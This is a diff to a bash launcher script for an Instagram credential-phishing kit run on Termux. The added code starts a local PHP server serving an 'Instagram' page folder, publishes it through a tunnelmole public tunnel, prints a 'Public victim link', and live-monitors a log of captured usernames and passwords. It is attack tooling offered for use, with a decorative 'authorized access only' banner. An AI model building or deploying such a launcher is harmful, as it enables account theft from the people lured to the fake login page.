@@ -1,4 +1,7 @@
 #!/bin/bash
+clear
+# Default Port
+def_port='8080'
 
 # Color Codes
 white=$'\e[1;0m'
@@ -7,19 +10,77 @@ green=$'\e[1;32m'
 yellow=$'\e[1;33m'
 blue=$'\e[1;34m'
 pink=$'\e[1;35m'
-#aqua
 A=$'\e[1;36m'
 White=$'\e[1;37m'
 
+# File Path
+file_path="/storage/emulated/0/Download/User_data.txt"
 
-	printf "\n ${green}░CREATE░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░${RESET}"
-        echo ""
-	printf "\n ${red}[${white}-${red}]${blue} Starting PHP Server on Port: ${yellow}Default 8080\n"
-	cd /data/data/com.termux/files/home/Instagram && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-	sleep 2
-	printf "\n ${red}[${white}-${red}]${green} Suessfully Hosted link:=> ${yellow}http://127.0.0.1:8080"
-	printf "\n\n ${red}[${white}-${red}]${A} Press Ctrl + C to exit. ${white}\n"
-	tmole 8080
-        while [ true ]; do
-		sleep 0.75
-	done
+# Install tunnelmole if not installed
+if ! command -v tunnelmole >/dev/null 2>&1; then
+    printf "\n ${red}[${white}-${red}]${yellow} Please wait Server Installing...${white}\n"
+    npm install -g tunnelmole
+fi
+
+# Ask to delete file before starting
+printf "\n ${red}[${white}-${red}]${red} Do you want to delete the log file? (y/n): ${white}"
+read delete_choice
+
+if [[ "$delete_choice" == "y" || "$delete_choice" == "Y" ]]; then
+    if [ -f "$file_path" ]; then
+        rm "$file_path"
+        printf "\n ${red}[${white}-${red}]${green} Log file deleted successfully!${white}\n"
+    else
+        printf "\n ${red}[${white}-${red}]${yellow} Log file does not exist.${white}\n"
+    fi
+fi
+
+# Input Port
+printf "\n ${red}[${white}-${red}]${pink} Input Port ${white}[default:${def_port}]: ${yellow}"
+read port
+port="${port:-${def_port}}"
+printf "\n ${red}[${white}-${red}]${blue} Starting PHP Server on Port: ${yellow}${port}\n"
+cd /data/data/com.termux/files/home/Instagram || {
+    printf "\n ${red}[${white}!${red}]${yellow} Directory not found! Exiting...\n"
+    exit 1
+}
+
+php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
+
+printf "\n ${red}[${white}-${red}]${green} Starting Public Server...${white}\n"
+tunnelmole "$port" | tee tunnelmole_output.txt &  
+sleep 5  
+clear
+printf "\e[32m  [!]         WELCOME TO HACKER        [!]\e[0m"
+printf "\e[31m==============================================\e[0m"
+printf "\e[36m  [+] SYSTEM: TERMUX     \e[0m"
+printf "\e[36m  [+] POWERED BY: APPSHAKTI BANGLA          \e[0m"
+printf "\e[36m  [+] WARNING: AUTHORIZED ACCESS ONLY!       \e[0m"
+printf "\e[31m==============================================\e[0m"
+printf "\e[33m  📺 https://www.youtube.com/@appshaktibangla \e[0m"
+printf "\e[31m==============================================\e[0m"
+printf "\e[0m"
+
+# Extract Tunnelmole Public URL
+tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.tunnelmole\.net' tunnelmole_output.txt | head -n 1)
+
+printf "\n ${red}[${white}-${red}]${green} Successfully Public victim link:=> ${yellow}$tunnel_url ${white}\n"
+
+if command -v termux-open-url >/dev/null 2>&1 && [ ! -z "$tunnel_url" ]; then
+    termux-open-url "$tunnel_url"
+fi
+
+# Show file name being monitored
+printf "\n ${red}[${white}-${red}]${A} Press Ctrl C to exit. ${white}\n"
+printf "\n ${red}[${white}-${red}]${pink} Monitoring show in User&Pass Log file${green}\n"
+
+# Create the file if it doesn't exist
+if [ ! -f "$file_path" ]; then
+    touch "$file_path"
+    echo "..........Live data will be displayed here..........."
+fi
+
+# Live file monitoring with green color output
+tail -f "$file_path" | while read line; do
+    echo -e "${green}$line${white}"
+done
